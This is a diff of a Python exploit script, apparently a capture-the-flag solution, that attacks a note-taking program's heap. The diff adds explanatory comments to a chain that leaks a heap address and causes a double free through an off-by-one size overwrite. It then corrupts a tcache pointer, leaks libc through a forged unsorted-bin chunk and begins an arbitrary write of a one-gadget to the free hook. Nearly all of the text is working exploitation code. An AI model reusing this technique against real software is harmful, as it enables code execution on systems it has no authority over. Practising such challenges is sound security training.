@@ -65,44 +65,40 @@ def main():
     global r
     r = conn()
     
-    size = 0x180+8
-    
+    size = 0x188
     MAX = 0x200-1
     
+    newNote(size, "A") # 0
+    newNote(size, "B") # 1
     
-    newNote(size, "A"*(size-2)) # 0
-    newNote(size, "B"*(size-2)) # 1
-    # newNote(size, "hii") # 2
-    
-    adr, _ = viewNote(0)
-    
-    print(hex(adr))
+    adr, _ = viewNote(0) # heap leak
     
     delNote(1)
     delNote(0)
     
-    #pause()
     newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
     
-    delNote(1)
+    delNote(1) # Double free
     
-    pause()
-    newNote(0x100-0x10, p64(adr+0x70+0x120-8) + b"D"*(0x100-0x10-8-2))
-    newNote(size, "C"*(size-2))
+    # Chunk size is 0x100, which means 0x100-0x10 are used for user data
+    # The adr offset is const.
+    newNote(0x100-0x10, p64(adr+0x70+0x120-8))
+    newNote(size, "C") # Allocate B after corrupting it's pointer, we'll use this chunk to leak libc too (Index 1)
     
-    pause()
-    newNote(size, p64(0x511) + b"E"*(size-2-8)) # Controlled adr
+    newNote(size, p64(0x511)) # Controlled adr
     
+    # Decrease created_entries
     delNote(3)
     delNote(3)
     
     delNote(3)
-    newNote(MAX, "A"*(MAX-2))
+    newNote(MAX, "A")
     
     delNote(3)
+    # This will reach adr+0x510. Offset (0xa0) is the offset between adr+0x510 & the top chunk size.
     newNote(MAX, b"A"*(0x168) + p64(0xa1))
-    
-    delNote(1)
+
+    delNote(1) # Unsorted bin!
     adr, leak = viewNote(1)
     libc = u64(leak.ljust(8, b'\0')) - 0x1e4ca0
     
@@ -114,20 +110,17 @@ def main():
     print('free hook:', hex(free_hook))
     
     
-    # arb write
-    
-    size = 0x130+8
+    # arb write: Write one gadget
+    size = 0x138
     
     # # #
     
     newNote(size, "A"*(size-2)) # 0
     newNote(size, "B"*(size-2)) # 1
-    # newNote(size, "hii") # 2
     
     delNote(1)
     delNote(0)
     
-    #pause()
     newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
     
     delNote(1)
